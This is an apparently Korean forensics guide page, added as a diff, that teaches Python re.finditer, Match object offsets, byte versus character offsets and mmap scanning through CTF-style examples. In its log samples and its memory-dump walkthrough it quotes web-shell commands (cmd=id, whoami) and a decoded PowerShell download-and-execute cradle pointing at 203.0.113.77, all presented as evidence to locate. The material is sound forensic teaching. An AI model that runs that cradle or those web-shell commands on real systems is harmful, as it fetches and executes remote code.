@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang="ko" data-root="..">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="color-scheme" content="dark">
+<title>Python re.finditer와 Match 객체: 매칭 위치까지 얻는다 · FOR-0123 · 포렌식 오프라인 검색</title>
+<link rel="stylesheet" href="../assets/styles.css">
+</head>
+<body>
+<header class="site-header">
+  <div class="header-bar">
+    <a class="brand" href="../index.html">포렌식 오프라인 검색<span class="brand-sub">offline</span></a>
+    <div class="nav-search">
+      <input id="nav-q" type="search" placeholder="검색  (/)" autocomplete="off" spellcheck="false">
+    </div>
+    <nav class="nav-links">
+      <a href="../index.html?q=30%EC%B4%88">30초 트리아지</a>
+      <a href="../index.html?q=%EC%B9%98%ED%8A%B8%EC%8B%9C%ED%8A%B8">치트시트</a>
+    </nav>
+  </div>
+</header>
+<main class="page">
+  <div class="article-layout">
+    <article>
+      <div class="breadcrumb">
+        <a href="../index.html">홈</a> / <a href="../index.html?category=%EB%A1%9C%EA%B7%B8%2FRegex">로그/Regex</a> / FOR-0123
+      </div>
+      <header class="article-head">
+        <h1>Python re.finditer와 Match 객체: 매칭 위치까지 얻는다</h1>
+        <div class="article-tags">
+      <span class="badge badge-cat">로그/Regex</span>
+      <span class="badge badge-type">가이드</span>
+      <span class="badge badge-diff diff-basic">기본</span>
+      <span class="badge badge-crit">critical</span>
+      <span class="chip">windows</span>
+      <span class="chip">linux</span>
+        </div>
+      </header>
+      <div class="answer-box">
+    <span class="answer-label">한 줄 결론</span>
+    <p>re.finditer는 문자열 대신 Match 객체를 하나씩 흘려주는 이터레이터이므로, m.group()으로 값을, m.start()/m.span()으로 위치를, m.groupdict()로 필드 이름을 동시에 얻는다. 위치·메모리·이름 중 하나라도 필요하면 findall이 아니라 finditer가 답이다.</p>
+  </div>
+      <table class="meta-table">
+<tbody>
+<tr><th>추천 툴</th><td>Python, re, mmap</td></tr>
+<tr><th>artifact</th><td><code>memory dump</code> · <code>strings dump</code> · <code>access.log</code> · <code>text log</code></td></tr>
+<tr><th>파일 경로</th><td><code>/var/log/auth.log</code> · <code>/var/log/syslog</code></td></tr>
+<tr><th>regex</th><td><code>flag\{[^}]{1,64}\}</code> · <code>(?=(\d{4}))</code> · <code>-----BEGIN [A-Z ]+-----</code></td></tr>
+<tr><th>로그 필드</th><td><code>start</code> · <code>end</code> · <code>span</code> · <code>group</code> · <code>lastgroup</code></td></tr>
+<tr><th>파일 형식</th><td><code>log</code> · <code>txt</code> · <code>raw</code> · <code>bin</code></td></tr>
+<tr><th>검색 별칭</th><td>python finditer · 파이썬 매칭 위치 · 정규식 오프셋 · match 객체 사용법 · python re span · 겹치는 매칭</td></tr>
+</tbody>
+</table>
+      <div class="article-body">
+<h2 id="한-줄-결론">한 줄 결론</h2>
+<p><code>re.finditer</code>는 문자열 대신 <strong><code>Match</code> 객체를 하나씩 흘려주는 이터레이터</strong>이므로, <code>m.group()</code>으로 값을, <code>m.start()</code>/<code>m.span()</code>으로 위치를, <code>m.groupdict()</code>로 필드 이름을 동시에 얻는다. 위치·메모리·이름 중 하나라도 필요하면 <code>findall</code>이 아니라 <code>finditer</code>가 답이다.</p>
+<h2 id="어떤-문제에서-필요한가">어떤 문제에서 필요한가</h2>
+<ul><li>메모리 덤프나 디스크 이미지에서 찾은 문자열의 <strong>오프셋</strong>을 답해야 하는 상황</li><li>매칭 주변 문맥(앞뒤 수십 바이트)을 함께 봐야 판단이 되는 상황</li><li>수 GB 파일에서 매칭이 수십만 건이라 리스트로 담으면 메모리가 터지는 상황</li><li>캡처 그룹이 여러 개인데 인덱스가 아니라 <strong>이름</strong>으로 접근하고 싶은 상황</li><li>치환값을 계산해서 넣어야 하는 상황 (<code>re.sub</code>에 함수 전달)</li><li>겹치는 매칭을 세야 하는 상황</li></ul>
+<h2 id="문제에서-처음-볼-단서">문제에서 처음 볼 단서</h2>
+<ol><li>문제 지문의 &quot;오프셋&quot;, &quot;몇 번째 바이트&quot;, &quot;위치&quot;, &quot;주소&quot; — 전부 <code>finditer</code>다</li><li><code>findall</code>로 값은 나왔는데 &quot;그게 파일 어디냐&quot;를 못 답하는 순간</li><li>파일이 텍스트가 아니라 <code>.raw</code> <code>.mem</code> <code>.dd</code> <code>.bin</code> 이면 바이트 모드로 간다</li><li>같은 문자열이 여러 번 나오는데 어느 것이 정답인지 문맥으로 골라야 하는 상황</li></ol>
+<p><code>findall</code>과 <code>finditer</code>는 같은 패턴, 같은 매칭 집합을 본다. 다른 것은 <strong>무엇을 돌려주는가</strong>뿐이다.</p>
+<div class="code-block" data-lang="python"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-python">import re
+s = &#39;user=admin id=1001 user=guest id=1002&#39;
+
+re.findall(r&#39;user=(\w+)&#39;, s)
+# [&#39;admin&#39;, &#39;guest&#39;]
+
+[(m.start(), m.group(0), m.group(1)) for m in re.finditer(r&#39;user=(\w+)&#39;, s)]
+# [(0, &#39;user=admin&#39;, &#39;admin&#39;), (19, &#39;user=guest&#39;, &#39;guest&#39;)]</code></pre></div>
+<p><code>findall</code>은 값만, <code>finditer</code>는 값과 위치와 전체 매칭을 모두 준다.</p>
+<h2 id="30초-절차">30초 절차</h2>
+<div class="code-block" data-lang="python"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-python">import re
+
+text = open(&#39;strings.txt&#39;, encoding=&#39;utf-8&#39;, errors=&#39;replace&#39;).read()
+for m in re.finditer(r&#39;flag\{[^}]{1,64}\}&#39;, text):
+    print(m.start(), m.end(), m.group(0))</code></pre></div>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-text">40912 40941 flag{n0t_th3_r34l_0n3}
+812004 812038 flag{f1nd1t3r_g1v3s_y0u_0ffs3ts}</code></pre></div>
+<p>같은 패턴이 두 건 잡혔다. 어느 것이 정답인지는 <strong>주변 문맥</strong>으로 가른다.</p>
+<div class="code-block" data-lang="python"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-python">for m in re.finditer(r&#39;flag\{[^}]{1,64}\}&#39;, text):
+    lo, hi = max(0, m.start() - 60), m.end() + 60
+    print(f&#39;--- offset {m.start()} ---&#39;)
+    print(text[lo:hi].replace(&#39;\n&#39;, &#39; | &#39;))</code></pre></div>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-text">--- offset 40912 ---
+# decoy list, do not submit | flag{n0t_th3_r34l_0n3} | flag_check=False
+--- offset 812004 ---
+[+] auth ok uid=1000 | flag{f1nd1t3r_g1v3s_y0u_0ffs3ts} | [+] session closed</code></pre></div>
+<p><code>decoy</code>라는 단어가 앞에 붙은 쪽을 버린다. 오프셋이 있어야 이 판단이 가능하다.</p>
+<h2 id="상세-절차">상세 절차</h2>
+<h3 id="1단계-match-객체의-메서드-표">1단계 — <code>Match</code> 객체의 메서드 표</h3>
+<div class="table-wrap"><table><thead><tr><th>호출</th><th>반환</th><th>용도</th></tr></thead><tbody><tr><td><code>m.group()</code> / <code>m.group(0)</code></td><td>매칭 전체 문자열</td><td>원문 그대로 확인</td></tr><tr><td><code>m.group(1)</code></td><td>1번 캡처 그룹</td><td>값 추출</td></tr><tr><td><code>m.group(&#39;ip&#39;)</code></td><td>명명 그룹</td><td>이름으로 접근</td></tr><tr><td><code>m[0]</code>, <code>m[1]</code>, <code>m[&#39;ip&#39;]</code></td><td><code>group()</code>과 동일</td><td>짧게 쓰기</td></tr><tr><td><code>m.groups()</code></td><td>모든 캡처 그룹의 튜플</td><td>언패킹 <code>a, b = m.groups()</code></td></tr><tr><td><code>m.groupdict()</code></td><td>명명 그룹의 dict</td><td>CSV·표로 바로 변환</td></tr><tr><td><code>m.start()</code> / <code>m.start(1)</code></td><td>시작 인덱스 (전체 / 그룹)</td><td>오프셋 답안</td></tr><tr><td><code>m.end()</code> / <code>m.end(1)</code></td><td>끝 인덱스 (매칭 다음 위치)</td><td>슬라이싱</td></tr><tr><td><code>m.span()</code> / <code>m.span(1)</code></td><td><code>(start, end)</code> 튜플</td><td>한 번에</td></tr><tr><td><code>m.string</code></td><td>검색 대상 원본 문자열</td><td>문맥 잘라 보기</td></tr><tr><td><code>m.re</code></td><td>컴파일된 패턴 객체</td><td>어느 패턴이 걸렸는지</td></tr><tr><td><code>m.lastindex</code></td><td>마지막으로 매칭된 그룹 번호</td><td>선택 분기 판별</td></tr><tr><td><code>m.lastgroup</code></td><td>마지막으로 매칭된 명명 그룹 이름</td><td>분류 태깅</td></tr></tbody></table></div>
+<p><code>m.end()</code>는 <strong>매칭 다음 위치</strong>다. 그래서 <code>text[m.start():m.end()]</code>가 정확히 매칭 문자열이 되고, 매칭 길이는 <code>m.end() - m.start()</code>다. 오프셋 답안을 쓸 때 <code>end</code>를 마지막 문자 위치로 착각하면 값이 1 어긋난다.</p>
+<div class="code-block" data-lang="python"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-python">import re
+m = re.search(r&#39;\d+&#39;, &#39;id=1001;&#39;)
+m.span()                 # (3, 7)
+m.group()                # &#39;1001&#39;
+m.string[m.start():m.end()]   # &#39;1001&#39;
+m.end() - m.start()      # 4</code></pre></div>
+<h3 id="2단계-findall-대신-finditer를-쓰는-세-가지-이유">2단계 — <code>findall</code> 대신 <code>finditer</code>를 쓰는 세 가지 이유</h3>
+<div class="table-wrap"><table><thead><tr><th>이유</th><th><code>findall</code></th><th><code>finditer</code></th></tr></thead><tbody><tr><td>위치</td><td>없다</td><td><code>start</code> / <code>end</code> / <code>span</code></td></tr><tr><td>메모리</td><td>전체 결과 리스트를 만든다</td><td>이터레이터. 한 건씩 처리</td></tr><tr><td>전체 + 그룹 동시</td><td>그룹이 있으면 전체를 못 받는다</td><td><code>group(0)</code>과 <code>group(1)</code>을 같이</td></tr><tr><td>명명 그룹</td><td>이름 무시, 튜플만</td><td><code>groupdict()</code></td></tr><tr><td>조기 종료</td><td>다 훑은 뒤 자른다</td><td><code>break</code>로 즉시 멈춘다</td></tr></tbody></table></div>
+<p>수십만 건에서 앞의 다섯 건만 필요할 때 차이가 크다.</p>
+<div class="code-block" data-lang="python"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-python">import re
+PAT = re.compile(r&#39;-----BEGIN [A-Z ]+-----&#39;)
+
+with open(&#39;huge.txt&#39;, encoding=&#39;utf-8&#39;, errors=&#39;replace&#39;) as f:
+    text = f.read()
+
+for i, m in enumerate(PAT.finditer(text)):
+    print(m.start(), m.group())
+    if i &gt;= 4:
+        break          # 여기서 스캔이 멈춘다. findall 은 이미 다 훑었다</code></pre></div>
+<p>값 추출만 하고 위치가 필요 없다면 <code>findall</code>이 더 짧다. 선택 기준은 그것뿐이다. 패턴 자체를 다듬는 문제라면 <a href="./ipv4-regex.html">FOR-0128</a>의 IP 패턴 비교표가 출발점이고, <code>.NET</code> 쪽에서 같은 일을 하는 <code>MatchInfo</code> 객체는 <a href="./powershell-select-string.html">FOR-0121</a>에 정리돼 있다.</p>
+<h3 id="3단계-오프셋으로-원문-문맥-잘라-보기">3단계 — 오프셋으로 원문 문맥 잘라 보기</h3>
+<p>조사에서 매칭 그 자체보다 중요한 것이 <strong>그 주변</strong>이다.</p>
+<div class="code-block" data-lang="python"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-python">import re
+
+def context(text, m, width=80):
+    lo = max(0, m.start() - width)
+    hi = min(len(text), m.end() + width)
+    return text[lo:m.start()], m.group(0), text[m.end():hi]
+
+text = open(&#39;access.log&#39;, encoding=&#39;utf-8&#39;, errors=&#39;replace&#39;).read()
+for m in re.finditer(r&#39;cmd=[^ &amp;&quot;]+&#39;, text):
+    before, hit, after = context(text, m, 60)
+    print(f&#39;[{m.start()}] ...{before[-60:]}&gt;&gt;&gt;{hit}&lt;&lt;&lt;{after[:60]}...&#39;)</code></pre></div>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-text">[982114] ...113.77 - - [14/Mar/2026:07:20:15 +0900] &quot;GET /uploads/av4tar.php?&gt;&gt;&gt;cmd=id&lt;&lt;&lt; HTTP/1.1&quot; 200 42 ...
+[982203] ...113.77 - - [14/Mar/2026:07:20:31 +0900] &quot;GET /uploads/av4tar.php?&gt;&gt;&gt;cmd=whoami&lt;&lt;&lt; HTTP/1.1&quot; 200 38 ...</code></pre></div>
+<p>줄 번호가 필요하면 매칭 이전 구간의 줄바꿈을 센다.</p>
+<div class="code-block" data-lang="python"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-python">lineno = text.count(&#39;\n&#39;, 0, m.start()) + 1</code></pre></div>
+<p>이 방법은 <code>read()</code>로 읽은 전체 문자열에서만 성립한다. 줄 단위로 순회하면 <code>enumerate(f, 1)</code>로 줄 번호를 직접 센다.</p>
+<h3 id="4단계-문자-오프셋과-바이트-오프셋은-다르다">4단계 — 문자 오프셋과 바이트 오프셋은 다르다</h3>
+<p><code>str</code> 모드의 <code>m.start()</code>는 <strong>문자 인덱스</strong>다. 파일 안의 바이트 오프셋을 답해야 하면 바이너리로 열어 바이트 패턴을 쓴다.</p>
+<div class="code-block" data-lang="python"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-python">import re
+
+# 바이트 오프셋 — 이미지·덤프에서 답할 수 있는 값
+with open(&#39;memdump.raw&#39;, &#39;rb&#39;) as f:
+    data = f.read()
+for m in re.finditer(rb&#39;flag\{[^}]{1,64}\}&#39;, data):
+    print(hex(m.start()), m.group().decode(&#39;ascii&#39;, &#39;replace&#39;))</code></pre></div>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-text">0x1f3a40 flag{byt3_0ffs3t_1s_wh4t_th3y_w4nt}</code></pre></div>
+<div class="table-wrap"><table><thead><tr><th>모드</th><th>패턴 접두사</th><th><code>m.start()</code>의 의미</th><th>언제</th></tr></thead><tbody><tr><td>텍스트 (<code>&#39;r&#39;</code>, <code>encoding=</code>)</td><td><code>r&#39;...&#39;</code></td><td>문자 인덱스</td><td>로그 분석, 줄 번호</td></tr><tr><td>바이너리 (<code>&#39;rb&#39;</code>)</td><td><code>rb&#39;...&#39;</code></td><td>바이트 오프셋</td><td>이미지·덤프, 헥스 편집기와 대조</td></tr></tbody></table></div>
+<p>ASCII만 있는 파일이면 두 값이 같다. 한글이 하나라도 섞이면 UTF-8에서 3바이트를 차지하므로 문자 인덱스와 바이트 오프셋이 어긋난다. <strong>오프셋을 답으로 제출할 때는 반드시 바이너리 모드로 다시 확인한다.</strong></p>
+<p><code>errors=&#39;ignore&#39;</code>로 열면 깨진 바이트가 사라지면서 이후 모든 인덱스가 밀린다. 오프셋을 다룰 때 <code>&#39;ignore&#39;</code>는 금지다.</p>
+<p>GB 단위 파일은 <code>mmap</code>으로 전체 읽기를 피한다.</p>
+<div class="code-block" data-lang="python"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-python">import mmap, re
+
+with open(&#39;image.dd&#39;, &#39;rb&#39;) as f:
+    mm = mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ)
+    for m in re.finditer(rb&#39;\x89PNG\r\n\x1a\n&#39;, mm):
+        print(&#39;PNG header at&#39;, hex(m.start()))</code></pre></div>
+<p>카빙 대상 헤더의 오프셋이 그대로 나온다.</p>
+<h3 id="5단계-resub에-함수를-넘긴다">5단계 — <code>re.sub</code>에 함수를 넘긴다</h3>
+<p>치환값을 계산해야 할 때, <code>re.sub</code>의 두 번째 인자에 <strong>함수</strong>를 준다. 함수는 <code>Match</code> 객체를 받아 문자열을 반환한다.</p>
+<div class="code-block" data-lang="python"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-python">import re
+from datetime import datetime, timezone, timedelta
+
+KST = timezone(timedelta(hours=9))
+
+def to_kst(m):
+    dt = datetime.strptime(m.group(0), &#39;%Y-%m-%dT%H:%M:%SZ&#39;).replace(tzinfo=timezone.utc)
+    return dt.astimezone(KST).strftime(&#39;%Y-%m-%d %H:%M:%S KST&#39;)
+
+line = &#39;2026-03-14T09:58:44Z ERROR 인증 서버 응답 없음&#39;
+print(re.sub(r&#39;\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}Z&#39;, to_kst, line))</code></pre></div>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-text">2026-03-14 18:58:44 KST ERROR 인증 서버 응답 없음</code></pre></div>
+<p>UTC 로그를 KST로 통째로 옮기는 데 이 세 줄이면 끝난다. <code>Z</code> 접미사가 UTC를 뜻하고, KST는 UTC+9다.</p>
+<p>Base64 후보를 즉석 디코딩해 붙이는 것도 같은 방식이다.</p>
+<div class="code-block" data-lang="python"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-python">import base64, re
+
+def decode_b64(m):
+    try:
+        raw = base64.b64decode(m.group(0), validate=True)
+        return f&#39;{m.group(0)}  &lt;== {raw.decode(&quot;utf-8&quot;, &quot;replace&quot;)}&#39;
+    except Exception:
+        return m.group(0)
+
+print(re.sub(r&#39;[A-Za-z0-9+/]{20,}={0,2}&#39;, decode_b64, &#39;cmd=cG93ZXJzaGVsbCAtZW5jIEFB&#39;))</code></pre></div>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-text">cmd=cG93ZXJzaGVsbCAtZW5jIEFB  &lt;== powershell -enc AA</code></pre></div>
+<p>치환 문자열(함수가 아닌 경우)에서는 <code>\1</code>, <code>\g&lt;1&gt;</code>, <code>\g&lt;name&gt;</code>으로 그룹을 참조한다. 함수를 넘길 때는 이런 이스케이프 규칙을 신경 쓸 필요가 없다는 것이 또 하나의 장점이다.</p>
+<p><code>re.subn</code>은 <code>(결과문자열, 치환횟수)</code> 튜플을 준다. 몇 건을 바꿨는지 확인해야 할 때 쓴다.</p>
+<h3 id="6단계-resplit과-겹치는-매칭">6단계 — <code>re.split</code>과 겹치는 매칭</h3>
+<p><code>re.split(pattern, string, maxsplit=0)</code>은 패턴 기준으로 자른다. <strong>패턴에 캡처 그룹이 있으면 구분자도 결과에 포함된다.</strong></p>
+<div class="code-block" data-lang="python"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-python">import re
+
+re.split(r&#39;\s*[;,]\s*&#39;, &#39;a ; b, c&#39;)        # [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;]
+re.split(r&#39;\s*([;,])\s*&#39;, &#39;a ; b, c&#39;)      # [&#39;a&#39;, &#39;;&#39;, &#39;b&#39;, &#39;,&#39;, &#39;c&#39;]
+re.split(r&#39;(?&lt;=\])\s+&#39;, &#39;[07:19:02] msg&#39;)  # [&#39;[07:19:02]&#39;, &#39;msg&#39;]</code></pre></div>
+<p>구분자가 무엇이었는지 알아야 하면 그룹을 넣고, 아니면 <code>(?:...)</code>로 감싼다. 후방탐색 <code>(?&lt;=...)</code>은 폭이 0이므로 구분자를 남긴 채 자를 수 있다.</p>
+<p><code>finditer</code>와 <code>findall</code>은 모두 <strong>겹치지 않는</strong> 매칭만 준다. 겹치는 매칭이 필요하면 폭이 0인 전방탐색 안에 캡처를 넣는다.</p>
+<div class="code-block" data-lang="python"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-python">import re
+s = &#39;123456&#39;
+
+re.findall(r&#39;\d{4}&#39;, s)                # [&#39;1234&#39;]            겹치지 않음
+[m.group(1) for m in re.finditer(r&#39;(?=(\d{4}))&#39;, s)]
+# [&#39;1234&#39;, &#39;2345&#39;, &#39;3456&#39;]             겹치는 전부</code></pre></div>
+<p><code>(?=(...))</code>는 위치를 소비하지 않으므로 매칭 시작점이 한 칸씩만 전진한다. 카드번호 후보, 슬라이딩 윈도우 해시 탐색에 쓴다. 대신 문자열 길이만큼 시도하므로 큰 파일에서는 느리다.</p>
+<h2 id="출력-필드-해석">출력 필드 해석</h2>
+<p><code>finditer</code> 결과를 다루다 만나는 값들이다.</p>
+<div class="table-wrap"><table><thead><tr><th>상황</th><th>결과</th><th>주의</th></tr></thead><tbody><tr><td>매칭 없음</td><td>빈 이터레이터 (for 문이 0번 실행)</td><td><code>None</code>이 아니다. <code>if not list(it)</code>로 확인하면 이터레이터가 소진된다</td></tr><tr><td>이터레이터 재사용</td><td>두 번째 for 문은 0번 실행</td><td>두 번 돌려야 하면 <code>list(...)</code>로 고정한다</td></tr><tr><td>매칭 안 된 그룹</td><td><code>m.group(n)</code>이 <code>None</code></td><td><code>findall</code>은 <code>&#39;&#39;</code>, <code>finditer</code>는 <code>None</code>. 이 차이가 <code>TypeError</code>를 만든다</td></tr><tr><td><code>m.groupdict()</code>의 미매칭 키</td><td>값이 <code>None</code></td><td><code>groupdict(default=&#39;&#39;)</code>로 기본값 지정</td></tr><tr><td><code>m.end()</code></td><td>매칭 다음 위치</td><td>마지막 문자 위치가 아니다</td></tr><tr><td><code>m.start(1)</code></td><td>1번 그룹의 시작 위치</td><td>그룹이 미매칭이면 <code>-1</code></td></tr><tr><td><code>m.lastgroup</code></td><td>마지막 매칭 명명 그룹 이름</td><td>어느 분기가 걸렸는지 판별</td></tr></tbody></table></div>
+<p>미매칭 그룹이 <code>None</code>인 것을 잊으면 바로 터진다.</p>
+<div class="code-block" data-lang="python"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-python">import re
+m = re.search(r&#39;user=(\w+)(?: id=(\d+))?&#39;, &#39;user=admin&#39;)
+m.group(2)              # None
+int(m.group(2))         # TypeError: int() argument must be ... not &#39;NoneType&#39;
+int(m.group(2) or 0)    # 0    이렇게 방어한다</code></pre></div>
+<h2 id="pivot-다음에-볼-artifact">pivot: 다음에 볼 artifact</h2>
+<div class="table-wrap"><table><thead><tr><th>finditer로 얻은 것</th><th>다음 목표</th></tr></thead><tbody><tr><td>바이트 오프셋</td><td>헥스 편집기로 그 오프셋 이동. 헤더·푸터 확인 후 카빙</td></tr><tr><td>문자 오프셋 + 줄 번호</td><td>그 줄 앞뒤 문맥, 같은 세션의 다른 요청</td></tr><tr><td><code>m.lastgroup</code> 분류</td><td>공격 유형별 건수 집계</td></tr><tr><td>매칭 간 간격</td><td>자동화 여부 판정. 간격이 일정하면 스크립트</td></tr><tr><td>디코딩된 Base64</td><td>명령·URL·자격증명 → EVTX 4104 / 4688 대조</td></tr><tr><td>발견한 매직 바이트 오프셋</td><td>카빙 범위 결정</td></tr><tr><td>시각 문자열</td><td>UTC/KST 확정. <code>Z</code>는 UTC, <code>+0900</code>은 KST</td></tr></tbody></table></div>
+<h2 id="흔한-함정">흔한 함정</h2>
+<ul><li><strong>이터레이터를 두 번 도는 것.</strong> <code>finditer</code>의 결과는 한 번 소진되면 끝이다. 두 번째 for 문은 아무것도 실행하지 않는다. 왜 틀리나: 제너레이터의 상태가 소진 상태로 남는다. 어떻게: 두 번 이상 쓸 것은 <code>matches = list(PAT.finditer(text))</code>로 고정한다.</li><li><strong><code>m.end()</code>를 마지막 문자 위치로 보는 것.</strong> <code>end</code>는 매칭 다음 위치다. 오프셋 답이 1 어긋난다. 길이는 <code>end - start</code>, 마지막 문자 위치는 <code>end - 1</code>이다.</li><li><strong>문자 오프셋을 바이트 오프셋으로 제출하는 것.</strong> UTF-8에서 한글은 3바이트다. 한글이 섞인 파일에서 두 값은 다르다. 오프셋을 제출할 때는 <code>&#39;rb&#39;</code> + <code>rb&#39;...&#39;</code>로 다시 확인한다.</li><li><strong><code>errors=&#39;ignore&#39;</code>로 열고 오프셋을 쓰는 것.</strong> 버려진 바이트만큼 이후 인덱스가 전부 밀린다. <code>&#39;replace&#39;</code>는 문자 하나로 대체하므로 상대적으로 안전하지만, 정확한 바이트 오프셋은 바이너리 모드에서만 나온다.</li><li><strong>미매칭 그룹을 문자열로 다루는 것.</strong> <code>finditer</code>는 미매칭 그룹에 <code>None</code>을 준다(<code>findall</code>은 <code>&#39;&#39;</code>). <code>int(m.group(2))</code>가 <code>TypeError</code>로 죽는다. <code>m.group(2) or 0</code>, <code>m.groupdict(default=&#39;&#39;)</code>로 방어한다.</li><li><strong>겹치는 매칭을 기대하는 것.</strong> <code>finditer</code>는 겹치지 않는 매칭만 준다. <code>&#39;123456&#39;</code>에서 <code>\d{4}</code>는 1건이다. 겹치는 전부가 필요하면 <code>(?=(\d{4}))</code>를 쓴다.</li><li><strong><code>re.split</code>에 캡처 그룹을 남기는 것.</strong> 구분자가 결과 리스트에 끼어들어 필드 개수가 두 배가 된다. 구분자가 필요 없으면 <code>(?:...)</code>로 감싼다.</li><li><strong><code>re.sub</code> 치환 문자열에서 <code>\1</code>을 잘못 쓰는 것.</strong> 일반 문자열에서는 <code>&#39;\1&#39;</code>이 제어문자가 된다. 항상 raw 문자열 <code>r&#39;\1&#39;</code> 또는 <code>r&#39;\g&lt;name&gt;&#39;</code>을 쓴다. 계산이 필요하면 함수를 넘긴다.</li><li><strong>큰 파일을 <code>read()</code>로 통째 올리고 <code>finditer</code>를 도는 것.</strong> <code>finditer</code>가 이터레이터여도 대상 문자열은 이미 메모리에 있다. GB 단위는 <code>mmap</code> + 바이트 패턴이다.</li><li><strong><code>(?=(...))</code>를 큰 파일에 쓰는 것.</strong> 모든 위치에서 시도하므로 O(n) 시도가 발생해 매우 느리다. 대상 구간을 먼저 좁힌 뒤에만 쓴다.</li></ul>
+<h2 id="교차검증">교차검증</h2>
+<p>오프셋은 반드시 다른 도구로 확인한다. 한 자리만 어긋나도 오답이다.</p>
+<div class="code-block" data-lang="python"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-python">import re
+data = open(&#39;memdump.raw&#39;, &#39;rb&#39;).read()
+for m in re.finditer(rb&#39;flag\{&#39;, data):
+    print(hex(m.start()))</code></pre></div>
+<div class="code-block" data-lang="bash"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-bash"># grep 로 바이트 오프셋 (-b) 확인
+grep -aob &#39;flag{&#39; memdump.raw | head
+
+# xxd 로 해당 오프셋을 직접 열어 본다 (0x1f3a40 = 2046528)
+xxd -s 2046528 -l 64 memdump.raw</code></pre></div>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-text">001f3a40: 666c 6167 7b62 7974 335f 3066 6673 3374  flag{byt3_0ffs3t
+001f3a50: 5f31 735f 7768 3474 5f74 6833 795f 7734  _1s_wh4t_th3y_w4</code></pre></div>
+<p><code>grep -b</code>의 오프셋과 <code>m.start()</code>가 같아야 한다. 다르면 텍스트 모드로 읽었거나 인코딩 변환이 끼어든 것이다. 헥스 편집기에서 같은 오프셋으로 이동해 눈으로 확인하는 것이 최종 확증이다.</p>
+<h2 id="mini-walkthrough">mini walkthrough</h2>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-text">문제:
+&quot;메모리 덤프에서 공격자가 사용한 PowerShell 명령을 찾고, 그 문자열이 시작되는
+ 오프셋을 16진수로 제출하세요.&quot;
+첨부: memdump.raw (4.0GB)
+
+1. 첫 시도 (실패):
+   text = open(&#39;memdump.raw&#39;, encoding=&#39;utf-8&#39;, errors=&#39;replace&#39;).read()
+   -&gt; 몇 분 뒤 MemoryError. 4GB 파일을 str 로 디코딩하면
+      문자당 최대 4바이트가 되어 원본보다 더 커진다.
+
+2. 두 번째 시도 (부분 실패) — errors=&#39;replace&#39; 로 크기를 줄이려 해도 같다.
+   접근 자체가 틀렸다. 바이너리 + mmap 으로 바꾼다.
+
+   import mmap, re
+   f = open(&#39;memdump.raw&#39;, &#39;rb&#39;)
+   mm = mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ)
+
+3. 세 번째 시도 (0건) — ASCII 로만 찾았다
+   list(re.finditer(rb&#39;powershell&#39;, mm))[:3]
+   -&gt; []   0건.
+
+   원인: Windows 프로세스 메모리의 명령행은 UTF-16LE 다.
+        &#39;powershell&#39; 은 70 00 6f 00 77 00 ... 로 들어 있다.
+
+4. 접근 변경 — UTF-16LE 패턴을 만든다
+   pat = re.compile(b&#39;p\x00o\x00w\x00e\x00r\x00s\x00h\x00e\x00l\x00l\x00&#39;, re.I)
+   hits = [m.start() for m in pat.finditer(mm)]
+   print(len(hits), [hex(h) for h in hits[:3]])
+   -&gt; 217 [&#39;0x8a1c220&#39;, &#39;0x8a1c9e0&#39;, &#39;0x91b3110&#39;]
+
+5. 문맥을 잘라 인코딩된 명령을 찾는다
+   for m in pat.finditer(mm):
+       chunk = mm[m.start():m.start() + 600]
+       s = chunk.decode(&#39;utf-16-le&#39;, &#39;replace&#39;)
+       if &#39;-enc&#39; in s.lower() or &#39;-encodedcommand&#39; in s.lower():
+           print(hex(m.start()), s.split(&#39;\x00&#39;)[0][:200])
+           break
+   -&gt; 0x91b3110 powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUA...
+
+6. 디코딩
+   import base64
+   b64 = &#39;SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUA...&#39;
+   print(base64.b64decode(b64).decode(&#39;utf-16-le&#39;, &#39;replace&#39;))
+   -&gt; IEX(New-Object Net.WebClient).DownloadString(&#39;http://203.0.113.77/a.ps1&#39;)
+
+   PowerShell 의 -EncodedCommand 는 UTF-16LE 를 Base64 로 감싼 것이다.
+
+7. 교차검증
+   grep -aob &#39;p.o.w.e.r.s.h.e.l.l&#39; memdump.raw | head
+   xxd -s 152426256 -l 48 memdump.raw
+   -&gt; 0x91b3110 = 152426256. 같은 위치에서 같은 바이트 확인.
+
+정답: 오프셋 0x91b3110 /
+      명령 IEX(New-Object Net.WebClient).DownloadString(&#39;http://203.0.113.77/a.ps1&#39;)</code></pre></div>
